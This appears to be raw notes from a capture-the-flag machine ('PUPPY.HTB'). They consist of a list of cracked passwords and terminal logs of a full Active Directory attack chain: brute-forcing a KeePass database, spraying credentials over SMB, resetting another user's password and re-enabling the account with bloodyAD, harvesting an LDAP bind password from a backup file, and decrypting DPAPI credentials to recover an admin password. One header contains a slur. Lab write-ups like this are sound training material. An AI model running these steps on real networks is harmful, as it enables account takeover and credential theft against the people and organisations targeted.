

```
steve tucker: Steve2025!

samuel blake: ILY2025!

jamie williamson: JamieLove2025!

antony c edwards: Antman2025!

adam silver: HJKL2025!
```




```python
^C⏎                                                                                                                                                                                                                                          kali@kali ~/keepass4brute (master) [SIGINT]> ./keepass4brute.sh ~/recovery.kdbx /usr/share/wordlists/rockyou.txt 
keepass4brute 1.3 by r3nt0n
https://github.com/r3nt0n/keepass4brute

[+] Words tested: 36/14344392 - Attempts per minute: 135 - Estimated time remaining: 10 weeks, 3 days
[+] Current attempt: liverpool

[*] Password found: liverpool
kali@kali ~/keepass4brute (master)> ps aux | grep -ie 'keep'
kali      161293  2.8  1.7 877436 133992 ?       SLl  17:10   0:02 /usr/bin/keepassxc /home/kali/recovery.kdbx
kali      161996  0.0  0.0   6468  2280 pts/2    S+   17:11   0:00 grep --color=auto -ie keep
kali@kali ~/keepass4brute (master)> nxc smb 10.129.3.217 -u 'adam.silver'  -p 'HJKL2025!' 
SMB         10.129.3.217    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.129.3.217    445    DC               [-] PUPPY.HTB\adam.silver:HJKL2025! STATUS_LOGON_FAILURE 
kali@kali ~/keepass4brute (master)> nxc smb 10.129.3.217 -u 'adam.silver'  -p 'HJKL2025!' --local-auth
SMB         10.129.3.217    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:DC) (signing:True) (SMBv1:False)
SMB         10.129.3.217    445    DC               [-] DC\adam.silver:HJKL2025! STATUS_LOGON_FAILURE 
kali@kali ~/keepass4brute (master)> nxc smb 10.129.3.217 -u 'jamie.williams'  -p 'JamieLove2025!' 
SMB         10.129.3.217    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.129.3.217    445    DC               [-] PUPPY.HTB\jamie.williams:JamieLove2025! STATUS_LOGON_FAILURE 
kali@kali ~/keepass4brute (master)> nxc smb 10.129.3.217 -u 'jamie.williams'  -p 'JamieLove2025!' --local-auth
SMB         10.129.3.217    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:DC) (signing:True) (SMBv1:False)
SMB         10.129.3.217    445    DC               [-] DC\jamie.williams:JamieLove2025! STATUS_LOGON_FAILURE 
kali@kali ~/keepass4brute (master)> nxc smb 10.129.3.217 -u 'ant.edwards'  -p 'Antman2025!' --local-auth
SMB         10.129.3.217    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:DC) (signing:True) (SMBv1:False)
SMB         10.129.3.217    445    DC               [-] DC\ant.edwards:Antman2025! STATUS_LOGON_FAILURE 
kali@kali ~/keepass4brute (master)> nxc smb 10.129.3.217 -u 'ant.edwards'  -p 'Antman2025!' 
SMB         10.129.3.217    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.129.3.217    445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025! 
kali@kali ~/keepass4brute (master)> nxc smb 10.129.3.217 -u 'adam.silver'  -p 'HJKL2025!'
SMB         10.129.3.217    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.129.3.217    445    DC               [-] PUPPY.HTB\adam.silver:HJKL2025! STATUS_LOGON_FAILURE 
kali@kali ~/keepass4brute (master)> nxc smb 10.129.3.217 -u 'adam.silver'  -p 'HJKL2025!' --local-auth
SMB         10.129.3.217    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:DC) (signing:True) (SMBv1:False)
SMB         10.129.3.217    445    DC               [-] DC\adam.silver:HJKL2025! STATUS_LOGON_FAILURE 

```




```
kali@kali ~> bloodyAD --host 10.129.3.217 -d PUPPY.HTB -u 'ant.edwards'  -p 'Antman2025!' set password adam.silver whatthefuck123!
[+] Password changed successfully!

```



```
kali@kali ~> bloodyAD --host 10.129.3.217 -d PUPPY.HTB -u 'ant.edwards'  -p 'Antman2025!' remove uac adam.silver -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl

```



```
kali@kali ~> nxc smb 10.129.3.217 -u 'adam.silver'  -p 'whatthefuck123!'
SMB         10.129.3.217    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.129.3.217    445    DC               [+] PUPPY.HTB\adam.silver:whatthefuck123! 
```



```python
kali@kali ~> cat nms-auth-config.xml.bak
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>

```



- acls nothing
- groups nothing




```
DFBE70A7E5CC19A398EBF1B96859CE5D
C:\users\steph.cooper\appdata\local\microsoft\credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
```


```
gci -Force C:\users\steph.cooper\appdata\roaming\microsoft\protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
```


```
kali@kali ~> dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407  -sid S-1-5-21-1487982659-1829050783-2281216199-1107  -password 'ChefSteph2025!'
Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84

```


## your schizophrenic  retard check raoming

```
kali@kali ~> dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description : 
Unknown     : 
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```